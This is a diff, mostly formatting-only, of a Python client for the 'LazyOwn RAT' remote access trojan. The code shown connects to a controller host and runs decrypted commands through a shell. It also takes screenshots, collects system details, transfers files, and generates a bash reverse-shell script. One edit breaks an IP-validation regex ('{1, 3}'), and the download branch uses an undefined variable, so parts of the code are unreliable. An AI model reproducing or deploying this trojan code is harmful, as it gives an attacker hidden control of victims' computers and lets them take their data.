@@ -17,6 +17,7 @@ Descripción: Cliente LazyOwn Rat
 ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
 
 """
+
 import argparse
 import base64
 import binascii
@@ -35,17 +36,21 @@ def signal_handler(sig, frame):
     print("\n [<-] Saliendo...")
     should_exit = True
 
+
 signal.signal(signal.SIGINT, signal_handler)
 
 try:
     from PIL import ImageGrab
+
     screenshot_available = True
 except (ImportError, OSError) as e:
     screenshot_available = False
     print(f"[-] Screenshot functionality is not available: {e}")
 
+
 def pad(s):
     return s + b"\0" * (AES.block_size - len(s) % AES.block_size)
+
 
 def encrypt(plaintext, key):
     plaintext = pad(plaintext)
@@ -53,48 +58,50 @@ def encrypt(plaintext, key):
     cipher = AES.new(key, AES.MODE_CBC, iv)
     return iv + cipher.encrypt(plaintext)
 
+
 def decrypt(ciphertext, key):
-    iv = ciphertext[:AES.block_size]
+    iv = ciphertext[: AES.block_size]
     cipher = AES.new(key, AES.MODE_CBC, iv)
-    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
-    return plaintext.rstrip(b'\0')
+    plaintext = cipher.decrypt(ciphertext[AES.block_size :])
+    return plaintext.rstrip(b"\0")
+
 
 def handle_command(cmd, key):
-    if cmd.startswith('upload'):
-        _, filename = cmd.split(' ', 1)
-        upload_path = os.path.join('upload', filename)
-        with open(upload_path, 'rb') as f:
+    if cmd.startswith("upload"):
+        _, filename = cmd.split(" ", 1)
+        upload_path = os.path.join("upload", filename)
+        with open(upload_path, "rb") as f:
             data = f.read()
         return data
 
-    elif cmd.startswith('download'):
-        _, filename = cmd.split(' ', 1)
-        download_path = os.path.join('download', filename)
-        if not os.path.exists('download'):
-            os.makedirs('download')
-        with open(download_path, 'wb') as f:
+    elif cmd.startswith("download"):
+        _, filename = cmd.split(" ", 1)
+        download_path = os.path.join("download", filename)
+        if not os.path.exists("download"):
+            os.makedirs("download")
+        with open(download_path, "wb") as f:
             f.write(decrypt(base64.b64decode(data), key))
-        return f'{download_path} downloaded successfully'
+        return f"{download_path} downloaded successfully"
 
-    elif cmd == 'screenshot' and screenshot_available:
+    elif cmd == "screenshot" and screenshot_available:
         screenshot = ImageGrab.grab()
-        screenshot.save('screenshot.png')
-        with open('screenshot.png', 'rb') as f:
+        screenshot.save("screenshot.png")
+        with open("screenshot.png", "rb") as f:
             data = f.read()
-        os.remove('screenshot.png')
+        os.remove("screenshot.png")
         return data
 
-    elif cmd == 'sysinfo':
-        info = f'System: {platform.system()}\n'
-        info += f'Node Name: {platform.node()}\n'
-        info += f'Release: {platform.release()}\n'
-        info += f'Version: {platform.version()}\n'
-        info += f'Machine: {platform.machine()}\n'
-        info += f'Processor: {platform.processor()}\n'
+    elif cmd == "sysinfo":
+        info = f"System: {platform.system()}\n"
+        info += f"Node Name: {platform.node()}\n"
+        info += f"Release: {platform.release()}\n"
+        info += f"Version: {platform.version()}\n"
+        info += f"Machine: {platform.machine()}\n"
+        info += f"Processor: {platform.processor()}\n"
         return info
 
-    elif cmd.startswith('lazyownreverse'):
-        _, ip, port = cmd.split(' ')
+    elif cmd.startswith("lazyownreverse"):
+        _, ip, port = cmd.split(" ")
         script_content = f"""#!/bin/bash
 
 echo "██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗"
@@ -115,7 +122,7 @@ function mostrar_ayuda {{
 
 function validar_ip {{
     local ip=$1
-    local valid_regex='^([0-9]{1,3}\\.){{3}}[0-9]{1,3}$'
+    local valid_regex='^([0-9]{1, 3}\\.){{3}}[0-9]{1, 3}$'
     if [[ $ip =~ $valid_regex ]]; then
         for segment in $(echo $ip | tr "." "\\n"); do
             if ((segment < 0 || segment > 255)); then
@@ -187,6 +194,7 @@ echo "[-] No se pudo establecer una conexión reverse shell con ninguna de las h
     else:
         return subprocess.check_output(cmd, shell=True)
 
+
 def main():
     BANNER = """
     ██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗
@@ -198,10 +206,10 @@ def main():
     [*] Iniciando: LazyOwn RAT [;,;]
     """
     print(BANNER)
-    parser = argparse.ArgumentParser(description='LazyOwnRAT Client')
-    parser.add_argument('--host', required=True, help='Server host to connect to')
-    parser.add_argument('--port', type=int, required=True, help='Server port to connect to')
-    parser.add_argument('--key', required=True, help='Encryption key (hex encoded)')
+    parser = argparse.ArgumentParser(description="LazyOwnRAT Client")
+    parser.add_argument("--host", required=True, help="Server host to connect to")
+    parser.add_argument("--port", type=int, required=True, help="Server port to connect to")
+    parser.add_argument("--key", required=True, help="Encryption key (hex encoded)")
     args = parser.parse_args()
     HOST = args.host
     PORT = args.port
@@ -210,7 +218,7 @@ def main():
     print(PORT)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((HOST, PORT))
-    print(f'[x] Conectado a {HOST}:{PORT}')
+    print(f"[x] Conectado a {HOST}:{PORT}")
 
     try:
         while True:
@@ -218,20 +226,21 @@ def main():
             if not data:
                 break
 
-            cmd = decrypt(data, KEY).decode('utf-8')
-            if cmd == 'quit':
+            cmd = decrypt(data, KEY).decode("utf-8")
+            if cmd == "quit":
                 break
 
             result = handle_command(cmd, KEY)
             if isinstance(result, bytes):
                 s.sendall(encrypt(result, KEY))
             else:
-                s.sendall(encrypt(result.encode('utf-8'), KEY))
+                s.sendall(encrypt(result.encode("utf-8"), KEY))
 
     except Exception as e:
-        print(f'[e] Error: {e}')
+        print(f"[e] Error: {e}")
     finally:
         s.close()
 
-if __name__ == '__main__':
+
+if __name__ == "__main__":
     main()
